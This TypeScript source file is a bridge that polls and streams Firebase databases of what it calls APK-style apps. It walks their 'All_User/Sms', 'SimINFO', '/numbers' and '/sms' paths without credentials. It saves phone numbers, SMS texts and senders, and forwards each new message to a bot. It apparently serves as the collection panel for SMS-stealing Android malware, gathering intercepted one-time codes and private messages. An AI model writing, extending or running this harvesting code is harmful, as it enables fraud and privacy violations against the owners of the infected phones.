export async function removeFirebaseNumber(_params: { firebaseUrl: string; panelName: string; deviceId: string }): Promise<void> {}
/**
 * Standard Firebase Realtime Database → Bot Bridge (SSE, no SDK)
 * For APK-style Firebase (e.g., biharnew2-default-rtdb.firebaseio.com)
 * Supports: panelName/All_User/Sms + panelName/All_User/SimINFO + root numbers
 */
import https from "node:https";
import { eq, and, isNull } from "drizzle-orm";
import {
  db,
  devicesTable,
  messagesTable,
  panelsTable,
  firebaseConfigsTable,
} from "@workspace/db";
import { notifyNewSMS, notifyDeviceActivity, notifyNumbersChanged } from "../bot/index.js";
import { logger } from "../lib/logger.js";
import { randomBytes } from "node:crypto";

const activeUrls = new Set<string>();
const seenMsgIds = new Set<string>();
const phoneCache = new Map<string, string>();
const simInfoCache = new Map<string, { sim1?: string; sim2?: string }>();
const panelIdCache = new Map<string, number>();

class FirebaseHttpError extends Error {
  constructor(
    message: string,
    readonly status: number,
    readonly responseData: unknown,
  ) {
    super(message);
    this.name = "FirebaseHttpError";
  }
}

function normalizeBase(rawUrl: string): string {
  try {
    const p = new URL(rawUrl);
    return `${p.protocol}//${p.hostname}`;
  } catch {
    return rawUrl.replace(/\/$/, "");
  }
}

function fetchJson(baseUrl: string, path: string): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const [pathPart, queryPart] = path.split("?", 2) as [string, string | undefined];
    const normalPath = pathPart.startsWith("/") ? pathPart : "/" + pathPart;
    const url = `${baseUrl}${normalPath}.json${queryPart ? "?" + queryPart : ""}`;
    const req = https.get(url, (res) => {
      let body = "";
      res.setEncoding("utf8");
      res.on("data", (chunk: string) => (body += chunk));
      res.on("end", () => {
        let data: unknown = null;
        try { data = JSON.parse(body); } catch {}
        const status = res.statusCode ?? 0;
        if (status < 200 || status >= 300) {
          reject(new FirebaseHttpError(`Firebase HTTP ${status}`, status, data));
          return;
        }
        resolve(data);
      });
      res.on("error", reject);
    });
    req.setTimeout(10_000, () => req.destroy(new Error("Firebase request timed out")));
    req.on("error", reject);
  });
}

function startSSE(
  baseUrl: string,
  path: string,
  onEvent: (type: string, data: { path: string; data: unknown }) => void
): void {
  const url = new URL(`${baseUrl}${path}.json`);
  let stopped = false;
  let retryTimer: NodeJS.Timeout | null = null;
  let retryDelayMs = 3_000;

  function scheduleReconnect() {
    if (stopped || retryTimer) return;
    const delay = retryDelayMs;
    retryDelayMs = Math.min(retryDelayMs * 2, 30_000);
    retryTimer = setTimeout(() => {
      retryTimer = null;
      connect();
    }, delay);
  }

  function connect(): void {
    if (stopped) return;
    const req = https.request(
      {
        hostname: url.hostname,
        path: url.pathname + url.search,
        headers: { Accept: "text/event-stream" },
      },
      (res) => {
        const status = res.statusCode ?? 0;
        if (status < 200 || status >= 300) {
          res.resume();
          if ([401, 403, 404, 423].includes(status)) {
            stopped = true;
            logger.warn({ path, baseUrl, status }, "Firebase SSE unavailable; retry disabled for this path");
          } else {
            logger.warn({ path, baseUrl, status }, "Firebase SSE unavailable; reconnecting with backoff");
            scheduleReconnect();
          }
          return;
        }

        let buf = "";
        res.on("data", (chunk: Buffer) => {
          buf += chunk.toString();
          const parts = buf.split("\n\n");
          buf = parts.pop() ?? "";
          for (const part of parts) {
            const lines = part.split("\n");
            let type = "message";
            let dataStr = "";
            for (const line of lines) {
              if (line.startsWith("event:")) type = line.slice(6).trim();
              else if (line.startsWith("data:")) dataStr = line.slice(5).trim();
            }
            if (dataStr && type !== "cancel" && type !== "auth_revoked") {
              try {
                onEvent(type, JSON.parse(dataStr) as { path: string; data: unknown });
              } catch {}
            }
          }
        });
        res.on("end", () => {
          logger.warn({ path, baseUrl }, "Firebase SSE ended; reconnecting with backoff");
          scheduleReconnect();
        });
        res.on("error", scheduleReconnect);
      }
    );
    req.on("error", scheduleReconnect);
    req.end();
  }
  connect();
}

async function getOrCreatePanel(name: string, baseUrl?: string): Promise<number> {
  if (panelIdCache.has(name)) {
    if (baseUrl) {
      await db
        .update(panelsTable)
        .set({ firebaseUrl: baseUrl })
        .where(eq(panelsTable.name, name))
        .catch(() => {});
    }
    return panelIdCache.get(name)!;
  }
  const existing = await db
    .select({ id: panelsTable.id })
    .from(panelsTable)
    .where(eq(panelsTable.name, name))
    .limit(1);
  if (existing.length) {
    panelIdCache.set(name, existing[0].id);
    if (baseUrl) {
      await db
        .update(panelsTable)
        .set({ firebaseUrl: baseUrl })
        .where(eq(panelsTable.id, existing[0].id))
        .catch(() => {});
    }
    return existing[0].id;
  }
  const [panel] = await db
    .insert(panelsTable)
    .values({ name, apiKey: randomBytes(24).toString("hex"), firebaseUrl: baseUrl ?? null })
    .returning({ id: panelsTable.id });
  panelIdCache.set(name, panel.id);
  return panel.id;
}

async function upsertDevice(params: {
  panelId: number;
  deviceId: string;
  phoneNumber: string;
  model?: string;
  simNumber?: string;
  setOnline?: boolean;
  allowCreate?: boolean;
}): Promise<number | null> {
  const setOnline = params.setOnline !== false;
  const existing = await db
    .select({ id: devicesTable.id, isOnline: devicesTable.isOnline, phoneNumber: devicesTable.phoneNumber })
    .from(devicesTable)
    .where(eq(devicesTable.deviceId, params.deviceId))
    .limit(1);
  if (existing.length) {
    await db
      .update(devicesTable)
      .set({
        phoneNumber: params.phoneNumber || undefined,
        ...(setOnline ? { isOnline: true, lastSeen: new Date() } : {}),
      })
      .where(eq(devicesTable.deviceId, params.deviceId));
    const event = !existing[0].phoneNumber && params.phoneNumber
      ? "new"
      : setOnline && !existing[0].isOnline
        ? "online"
        : !setOnline && existing[0].isOnline
          ? "offline"
          : null;
    if (event) void notifyDeviceActivity(event, existing[0].id);
    if (setOnline || event) notifyNumbersChanged();
    return existing[0].id;
  }
  if (!params.allowCreate) return null;

  const [created] = await db
    .insert(devicesTable)
    .values({
      panelId: params.panelId,
      deviceId: params.deviceId,
      phoneNumber: params.phoneNumber || null,
      model: params.model ?? null,
      simNumber: params.simNumber ?? null,
      isOnline: setOnline,
      lastSeen: setOnline ? new Date() : null,
      approvalStatus: "auto",
    })
    .onConflictDoUpdate({
      target: devicesTable.deviceId,
      set: {
        phoneNumber: params.phoneNumber || undefined,
        ...(setOnline ? { isOnline: true, lastSeen: new Date() } : {}),
      },
    })
    .returning({ id: devicesTable.id });
  void notifyDeviceActivity("new", created.id);
  notifyNumbersChanged();
  return created.id;
}

function parsePhone(sim1: string): string {
  return sim1.split(" ")[0]?.replace(/^\+91/, "") ?? sim1;
}

function sim2DeviceId(panelName: string, deviceId: string): string {
  return `${panelName}:sim2:${deviceId}`;
}

async function getSimInfo(
  baseUrl: string,
  panelName: string,
  deviceId: string,
): Promise<{ sim1?: string; sim2?: string }> {
  const cacheKey = `${panelName}:${deviceId}`;
  const cached = simInfoCache.get(cacheKey);
  if (cached) return cached;
  try {
    const info = (await fetchJson(
      baseUrl,
      `/${panelName}/All_User/SimINFO/${deviceId}`,
    )) as { sim1?: string; sim2?: string } | null;
    const result = info ?? {};
    simInfoCache.set(cacheKey, result);
    return result;
  } catch {
    return {};
  }
}

async function syncSimInfoDevice(
  panelId: number,
  panelName: string,
  deviceId: string,
  info: { sim1?: string; sim2?: string },
  setOnline: boolean,
): Promise<void> {
  const sim1 = info.sim1 ? parsePhone(info.sim1) : deviceId;
  const sim2 = info.sim2 ? parsePhone(info.sim2) : "";
  simInfoCache.set(`${panelName}:${deviceId}`, info);
  await upsertDevice({ panelId, deviceId, phoneNumber: sim1, setOnline });
  if (sim2 && sim2 !== sim1) {
    await upsertDevice({
      panelId,
      deviceId: sim2DeviceId(panelName, deviceId),
      phoneNumber: sim2,
      setOnline,
    });
  }
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return !!value && typeof value === "object" && !Array.isArray(value);
}

function rootNumbersPanelName(baseUrl: string): string {
  try {
    return `numbers@${new URL(baseUrl).hostname}`;
  } catch {
    return "numbers";
  }
}

function rootDeviceId(baseUrl: string, rawNumber: string): string {
  try {
    return `numbers:${new URL(baseUrl).hostname}:${rawNumber}`;
  } catch {
    return `numbers:${rawNumber}`;
  }
}

function rootNumberIsOnline(value: unknown, defaultOnline: boolean): boolean {
  if (!isRecord(value)) return defaultOnline;
  if (typeof value.isOnline === "boolean") return value.isOnline;
  if (typeof value.is_online === "boolean") return value.is_online;
  if (typeof value.online === "boolean") return value.online;
  if (typeof value.status === "string") {
    const status = value.status.toLowerCase();
    if (status === "online") return true;
    if (status === "offline") return false;
  }
  return defaultOnline;
}

async function syncRootNumbers(
  baseUrl: string,
  panelName: string,
  numbers: Record<string, unknown>,
  defaultOnline: boolean,
): Promise<void> {
  const panelId = await getOrCreatePanel(panelName, baseUrl);
  let synced = 0;
  for (const [rawNumber, value] of Object.entries(numbers)) {
    if (value === null || value === undefined) continue;
    const phoneNumber = parsePhone(rawNumber);
    if (!phoneNumber) continue;
    await upsertDevice({
      panelId,
      deviceId: rootDeviceId(baseUrl, rawNumber),
      phoneNumber,
      setOnline: rootNumberIsOnline(value, defaultOnline),
    }).catch((err) => logger.warn({ err, panelName, phoneNumber }, "Firebase root number sync failed"));
    synced++;
  }
  if (synced > 0) {
    logger.info({ panelName, total: synced }, "Firebase: root numbers indexed");
  }
}

type RootSmsRecord = {
  from?: unknown;
  to?: unknown;
  text?: unknown;
  msg?: unknown;
  body?: unknown;
  timestamp?: unknown;
  date?: unknown;
};

function rootSmsTimestamp(value: unknown): Date {
  if (typeof value === "number" && Number.isFinite(value)) return new Date(value);
  if (typeof value === "string") {
    const numeric = Number(value);
    if (Number.isFinite(numeric) && numeric > 0) return new Date(numeric);
    const parsed = Date.parse(value);
    if (Number.isFinite(parsed)) return new Date(parsed);
  }
  return new Date();
}

function rootSmsText(record: RootSmsRecord): string {
  for (const value of [record.text, record.msg, record.body]) {
    if (typeof value === "string" && value.trim()) return value;
  }
  return "";
}

async function insertMessageIfMissing(params: {
  deviceId: number;
  fromNumber: string | null;
  body: string | null;
  receivedAt: Date;
}): Promise<number | null> {
  const fromCondition = params.fromNumber === null
    ? isNull(messagesTable.fromNumber)
    : eq(messagesTable.fromNumber, params.fromNumber);
  const [existing] = await db
    .select({ id: messagesTable.id })
    .from(messagesTable)
    .where(and(
      eq(messagesTable.deviceId, params.deviceId),
      fromCondition,
      params.body === null ? isNull(messagesTable.body) : eq(messagesTable.body, params.body),
      eq(messagesTable.receivedAt, params.receivedAt),
    ))
    .limit(1);
  if (existing) return null;

  const [saved] = await db
    .insert(messagesTable)
    .values(params)
    .returning({ id: messagesTable.id });
  return saved?.id ?? null;
}

async function saveRootSms(
  baseUrl: string,
  panelName: string,
  record: RootSmsRecord,
  defaultOnline: boolean,
  notify: boolean,
): Promise<boolean> {
  const rawNumber = typeof record.to === "string" ? record.to.trim() : "";
  const phoneNumber = rawNumber ? parsePhone(rawNumber) : "";
  const body = rootSmsText(record);
  if (!phoneNumber || !body) return false;

  const panelId = await getOrCreatePanel(panelName, baseUrl);
  const deviceId = rootDeviceId(baseUrl, rawNumber);
  const dbDeviceId = await upsertDevice({
    panelId,
    deviceId,
    phoneNumber,
    setOnline: rootNumberIsOnline(record, defaultOnline),
  });
  const fromNumber = typeof record.from === "string" ? record.from : null;
  const receivedAt = rootSmsTimestamp(record.timestamp ?? record.date);
  if (dbDeviceId == null) return false;
  const savedId = await insertMessageIfMissing({
    deviceId: dbDeviceId,
    fromNumber,
    body,
    receivedAt,
  });
  if (savedId === null) return false;
  if (notify) {
    const [device] = await db.select().from(devicesTable)
      .where(eq(devicesTable.id, dbDeviceId))
      .limit(1);
    if (device) {
      void notifyNewSMS({
        device,
        from: fromNumber ?? "Unknown",
        body,
        sim: phoneNumber,
        timestamp: receivedAt,
        messageId: savedId,
      });
    }
  }
  return true;
}

async function importRootSmsHistory(
  baseUrl: string,
  panelName: string,
  numbers: Set<string>,
  defaultOnline: boolean,
): Promise<void> {
  const rawSms = await fetchJson(baseUrl, "/sms").catch(() => null);
  if (!isRecord(rawSms)) return;

  const byNumber = new Map<string, { record: RootSmsRecord; timestamp: Date }[]>();
  for (const value of Object.values(rawSms)) {
    if (!isRecord(value)) continue;
    const record = value as RootSmsRecord;
    const rawNumber = typeof record.to === "string" ? record.to.trim() : "";
    const phoneNumber = rawNumber ? parsePhone(rawNumber) : "";
    if (!phoneNumber || !numbers.has(phoneNumber)) continue;
    const list = byNumber.get(phoneNumber) ?? [];
    list.push({ record, timestamp: rootSmsTimestamp(record.timestamp ?? record.date) });
    byNumber.set(phoneNumber, list);
  }

  let imported = 0;
  for (const list of byNumber.values()) {
    list.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
    for (const item of list.slice(0, 3).reverse()) {
      if (await saveRootSms(baseUrl, panelName, item.record, defaultOnline, false)) imported++;
    }
  }
  if (imported > 0) {
    logger.info({ panelName, total: imported }, "Firebase: root SMS history indexed");
  }
}

function listenRootSms(
  baseUrl: string,
  panelName: string,
  numbers: Set<string>,
  defaultOnline: boolean,
): void {
  startSSE(baseUrl, "/sms", (type, payload) => {
    if (type === "put" && payload.path === "/") return;
    if (type !== "put" && type !== "patch") return;
    const value = payload.data;
    if (!isRecord(value)) return;
    const rawNumber = typeof value.to === "string" ? value.to.trim() : "";
    const phoneNumber = rawNumber ? parsePhone(rawNumber) : "";
    if (phoneNumber && !numbers.has(phoneNumber)) return;
    void saveRootSms(baseUrl, panelName, value as RootSmsRecord, defaultOnline, true);
  });
}

function listenRootNumbers(baseUrl: string, panelName: string, defaultOnline: boolean): void {
  const knownNumbers = new Set<string>();
  let historyImported = false;
  startSSE(baseUrl, "/numbers", (type, payload) => {
    if (type === "put" && payload.path === "/") {
      if (isRecord(payload.data)) {
        void (async () => {
          const numbers = payload.data as Record<string, unknown>;
          for (const rawNumber of Object.keys(numbers)) knownNumbers.add(parsePhone(rawNumber));
          await syncRootNumbers(baseUrl, panelName, numbers, defaultOnline);
          if (!historyImported) {
            historyImported = true;
            await importRootSmsHistory(baseUrl, panelName, knownNumbers, defaultOnline);
          }
        })();
      }
      return;
    }
    if ((type === "put" || type === "patch") && payload.path.split("/").filter(Boolean).length === 1) {
      const rawNumber = decodeURIComponent(payload.path.split("/").filter(Boolean)[0] ?? "");
      if (!rawNumber || payload.data === null || payload.data === undefined) return;
      knownNumbers.add(parsePhone(rawNumber));
      void syncRootNumbers(baseUrl, panelName, { [rawNumber]: payload.data }, defaultOnline);
    }
  });
  listenRootSms(baseUrl, panelName, knownNumbers, defaultOnline);
}

async function getPhone(baseUrl: string, panelName: string, deviceId: string): Promise<string> {
  const cacheKey = `${panelName}:${deviceId}`;
  if (phoneCache.has(cacheKey)) return phoneCache.get(cacheKey)!;
  const info = await getSimInfo(baseUrl, panelName, deviceId);
  const phone = info.sim1 ? parsePhone(info.sim1) : deviceId;
  phoneCache.set(cacheKey, phone);
  return phone;
}

function panelSmsTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value) && value > 0)
    return value < 1_000_000_000_000 ? value * 1000 : value;
  if (typeof value === "string") {
    const numeric = Number(value);
    if (Number.isFinite(numeric) && numeric > 0)
      return numeric < 1_000_000_000_000 ? numeric * 1000 : numeric;
    const parsed = Date.parse(value);
    if (Number.isFinite(parsed)) return parsed;
  }
  return Date.now();
}

async function processSms(params: {
  baseUrl: string;
  panelName: string;
  deviceId: string;
  msgId: string;
  msg: string;
  ph: string;
  dateMs: number;
  isInitial: boolean;
}): Promise<void> {
  const key = `${params.deviceId}:${params.msgId}`;
  if (seenMsgIds.has(key)) return;
  seenMsgIds.add(key);

  try {
    const [panelId, phone, simInfo] = await Promise.all([
      getOrCreatePanel(params.panelName, params.baseUrl),
      getPhone(params.baseUrl, params.panelName, params.deviceId),
      getSimInfo(params.baseUrl, params.panelName, params.deviceId),
    ]);
    const dbDeviceId = await upsertDevice({
      panelId,
      deviceId: params.deviceId,
      phoneNumber: phone,
      allowCreate: true,
    });
    if (!dbDeviceId) return;
    const receivedAt = new Date(params.dateMs);
    const fromNumber = params.ph ?? null;
    const body = params.msg ?? null;
    const [savedMessageId, [device]] = await Promise.all([
      insertMessageIfMissing({ deviceId: dbDeviceId, fromNumber, body, receivedAt }),
      db.select().from(devicesTable).where(eq(devicesTable.id, dbDeviceId)).limit(1),
    ]);

    if (device && !params.isInitial && savedMessageId !== null) {
      void notifyNewSMS({
        device,
        from: params.ph,
        body: params.msg,
        sim: device.phoneNumber ?? params.deviceId,
        timestamp: receivedAt,
        messageId: savedMessageId,
      });
    }

    if (simInfo.sim2 && parsePhone(simInfo.sim2) !== phone) {
      const sim2Phone = parsePhone(simInfo.sim2);
      const sim2Id = await upsertDevice({
        panelId,
        deviceId: sim2DeviceId(params.panelName, params.deviceId),
        phoneNumber: sim2Phone,
        setOnline: true,
        allowCreate: true,
      });
      if (sim2Id === null) return;
      const sim2MessageId = await insertMessageIfMissing({
        deviceId: sim2Id,
        fromNumber,
        body,
        receivedAt,
      });
      if (!params.isInitial && sim2MessageId !== null) {
        const [sim2Device] = await db.select().from(devicesTable)
          .where(eq(devicesTable.id, sim2Id))
          .limit(1);
        if (sim2Device) {
          void notifyNewSMS({
            device: sim2Device,
            from: params.ph,
            body: params.msg,
            sim: sim2Device.phoneNumber ?? sim2Phone,
            timestamp: receivedAt,
            messageId: sim2MessageId,
          });
        }
      }
    }

    logger.info({ panelName: params.panelName, deviceId: params.deviceId }, "Firebase SMS saved ✅");
  } catch (err) {
    logger.error({ err, key }, "Failed to process Firebase SMS");
  }
}

function listenPanelSms(baseUrl: string, panelName: string): void {
  logger.info({ panelName, baseUrl }, "Firebase: starting SMS listener");
  startSSE(baseUrl, `/${panelName}/All_User/Sms`, (type, payload) => {
    if (type === "put" && payload.path === "/") {
      const allDevices = payload.data as Record<string, Record<string, unknown>> | null;
      if (!allDevices) return;
      for (const [deviceId, msgs] of Object.entries(allDevices)) {
        if (!msgs || typeof msgs !== "object") continue;
        const recent = Object.entries(msgs)
          .filter(([, value]) => isRecord(value) && typeof value.msg === "string" && value.msg.trim())
          .sort(([, a], [, b]) =>
            panelSmsTimestamp((b as Record<string, unknown>).date) -
            panelSmsTimestamp((a as Record<string, unknown>).date)
          )
          .slice(0, 3);
        for (const [msgId, raw] of recent) {
          const smsData = raw as { msg: string; ph?: string; date?: unknown };
          void processSms({
            baseUrl,
            panelName,
            deviceId,
            msgId,
            msg: smsData.msg,
            ph: smsData.ph ?? "Unknown",
            dateMs: panelSmsTimestamp(smsData.date),
            isInitial: true,
          });
        }
      }
      logger.info({ panelName }, "Firebase: importing latest 3 SMS per device");
      return;
    }
    if (type === "patch" || type === "put") {
      const pathParts = payload.path.split("/").filter(Boolean);
      const data = payload.data;
      if (!pathParts.length || !data) return;

      if (pathParts.length === 1) {
        const msgs = data as Record<string, { msg: string; ph: string; date: string }>;
        for (const [msgId, smsData] of Object.entries(msgs)) {
          if (!smsData?.msg) continue;
          void processSms({
            baseUrl, panelName, deviceId: pathParts[0], msgId,
            msg: smsData.msg, ph: smsData.ph ?? "Unknown",
             dateMs: panelSmsTimestamp(smsData.date), isInitial: false,
          });
        }
      } else if (pathParts.length === 2) {
        const smsData = data as { msg: string; ph: string; date: string };
        if (!smsData?.msg) return;
        void processSms({
          baseUrl, panelName, deviceId: pathParts[0], msgId: pathParts[1],
          msg: smsData.msg, ph: smsData.ph ?? "Unknown",
           dateMs: panelSmsTimestamp(smsData.date), isInitial: false,
        });
      }
    }
  });
}

function listenSimInfo(baseUrl: string, panelName: string): void {
  startSSE(baseUrl, `/${panelName}/All_User/SimINFO`, async (type, payload) => {
    if (type === "put" && payload.path === "/") {
      const all = payload.data as Record<string, { sim1?: string; sim2?: string }> | null;
      if (!all) return;
      const panelId = await getOrCreatePanel(panelName, baseUrl).catch(() => null);
      if (!panelId) return;
      for (const [deviceId, info] of Object.entries(all)) {
        await syncSimInfoDevice(panelId, panelName, deviceId, info ?? {}, false).catch(() => {});
      }
      logger.info({ panelName, total: Object.keys(all).length }, "Firebase: initial SimINFO indexed");
      return;
    }
    if ((type === "patch" || type === "put") && payload.data) {
      const pathParts = payload.path.split("/").filter(Boolean);
      if (pathParts.length >= 1) {
        const deviceId = pathParts[0];
        const cacheKey = `${panelName}:${deviceId}`;
        const previous = simInfoCache.get(cacheKey) ?? {};
        const info = pathParts.length === 1
          ? (isRecord(payload.data) ? payload.data as { sim1?: string; sim2?: string } : previous)
          : { ...previous, [pathParts[1]]: payload.data } as { sim1?: string; sim2?: string };
        try {
          const panelId = await getOrCreatePanel(panelName, baseUrl);
          await syncSimInfoDevice(panelId, panelName, deviceId, info, true);
        } catch {}
      }
    }
  });
}

export async function startFirebaseUrl(rawUrl: string): Promise<{ panels: string[] }> {
  const baseUrl = normalizeBase(rawUrl);
  if (activeUrls.has(baseUrl)) {
    logger.info({ baseUrl }, "Firebase URL already active");
    return { panels: [] };
  }
  activeUrls.add(baseUrl);
  logger.info({ baseUrl }, "Firebase bridge starting...");

  try {
    const topLevel = (await fetchJson(baseUrl, "?shallow=true")) as Record<string, boolean> | null;
    if (!topLevel) throw new Error("Failed to fetch Firebase root");

    const [rootNumbers, rootWebStatus] = await Promise.all([
      fetchJson(baseUrl, "/numbers?shallow=true").catch(() => null),
      fetchJson(baseUrl, "/web_status").catch(() => null),
    ]);
    const hasRootNumbers = isRecord(rootNumbers) && Object.keys(rootNumbers).length > 0;
    const rootOnline = !isRecord(rootWebStatus) || rootWebStatus.is_online !== false;
    const rootPanelName = hasRootNumbers ? rootNumbersPanelName(baseUrl) : null;

    const knownNonPanels = new Set([
      "Verify_Device", "All_User", "All_Users", "clients", "all_pas", "messages",
      "numbers", "web_status",
    ]);
    const panels: string[] = [];
    for (const key of Object.keys(topLevel)) {
      if (knownNonPanels.has(key)) continue;
      const [sms, simInfo] = await Promise.all([
        fetchJson(baseUrl, `/${key}/All_User/Sms?shallow=true`).catch(() => null),
        fetchJson(baseUrl, `/${key}/All_User/SimINFO?shallow=true`).catch(() => null),
      ]);
      const hasSms = !!sms && typeof sms === "object" && Object.keys(sms).length > 0;
      const hasSimInfo = !!simInfo && typeof simInfo === "object" && Object.keys(simInfo).length > 0;
      if (hasSms || hasSimInfo) panels.push(key);
    }

    logger.info({ baseUrl, panels }, "Firebase: discovered panels");
    if (rootPanelName) {
      logger.info({ baseUrl, panelName: rootPanelName }, "Firebase: root numbers source detected");
      listenRootNumbers(baseUrl, rootPanelName, rootOnline);
    }
    for (const panel of panels) {
      listenPanelSms(baseUrl, panel);
      listenSimInfo(baseUrl, panel);
    }
    logger.info({ baseUrl }, "Firebase bridge active ✅");
    return { panels };
  } catch (err) {
    activeUrls.delete(baseUrl);
    if (err instanceof FirebaseHttpError && err.status === 404) {
      const responseData = err.responseData;
      const correctUrl = responseData && typeof responseData === "object" && "correctUrl" in responseData
        ? (responseData as { correctUrl?: unknown }).correctUrl
        : null;
      if (typeof correctUrl === "string") {
        const correctedBaseUrl = normalizeBase(correctUrl);
        if (correctedBaseUrl && correctedBaseUrl !== baseUrl) {
          logger.warn({ baseUrl, correctedBaseUrl }, "Firebase URL region corrected");
          await db
            .update(firebaseConfigsTable)
            .set({ url: correctedBaseUrl })
            .where(eq(firebaseConfigsTable.url, baseUrl))
            .catch((updateErr) => logger.warn({ updateErr, baseUrl, correctedBaseUrl }, "Failed to save corrected Firebase URL"));
          return startFirebaseUrl(correctedBaseUrl);
        }
      }
    }
    logger.error({ err, baseUrl }, "Firebase bridge init failed");
    throw err;
  }
}

export async function addFirebaseUrl(rawUrl: string, label?: string): Promise<{ panels: string[] }> {
  const baseUrl = normalizeBase(rawUrl);
  await db
    .insert(firebaseConfigsTable)
    .values({ url: baseUrl, label: label ?? null })
    .onConflictDoUpdate({
      target: firebaseConfigsTable.url,
      set: { label: label ?? null },
    });
  return startFirebaseUrl(baseUrl);
}

export async function getActiveFirebaseUrls(): Promise<string[]> {
  const candidates = [...activeUrls];
  const active = await Promise.all(candidates.map(async (baseUrl) => {
    try {
      await fetchJson(baseUrl, "?shallow=true");
      return baseUrl;
    } catch {
      activeUrls.delete(baseUrl);
      return null;
    }
  }));
  return active.filter((url): url is string => !!url);
}

export async function initFirebaseBridge(): Promise<void> {
  const saved = await db.select().from(firebaseConfigsTable);
  const configs = saved.filter((cfg) => !cfg.url.startsWith("zxkai::"));
  let nextIndex = 0;
  const worker = async (): Promise<void> => {
    while (nextIndex < configs.length) {
      const cfg = configs[nextIndex++];
      await startFirebaseUrl(cfg.url).catch((err) =>
        logger.error({ err, url: cfg.url }, "Failed to start saved Firebase URL")
      );
    }
  };
  const workerCount = Math.min(6, configs.length);
  if (workerCount > 0) {
    await Promise.all(Array.from({ length: workerCount }, () => worker()));
  }
  const envUrl = process.env.FIREBASE_DATABASE_URL ?? "";
  if (envUrl) {
    const baseUrl = normalizeBase(envUrl);
    if (!saved.find((c) => c.url === baseUrl)) {
      await startFirebaseUrl(baseUrl).catch((err) =>
        logger.error({ err, url: baseUrl }, "Failed to start env Firebase URL")
      );
    }
  }
}
